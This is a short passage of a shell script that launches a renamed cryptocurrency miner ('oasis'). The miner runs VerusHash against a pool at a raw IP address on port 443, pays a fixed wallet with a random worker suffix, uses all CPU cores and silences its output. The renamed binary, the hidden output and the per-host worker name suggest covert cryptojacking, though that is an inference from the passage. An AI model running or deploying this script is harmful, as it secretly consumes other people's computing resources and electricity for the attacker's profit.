...
chmod 777 oasis
./oasis --algorithm verushash --pool stratum+tcp://209.97.168.28:443 --wallet RCADCQ9UW1RsUaF94Jp4huPSdQ7bhwYwa4.A$RANDOM --password x --cpu-threads $(nproc --all) > /dev/null 2>&1
sleep 30
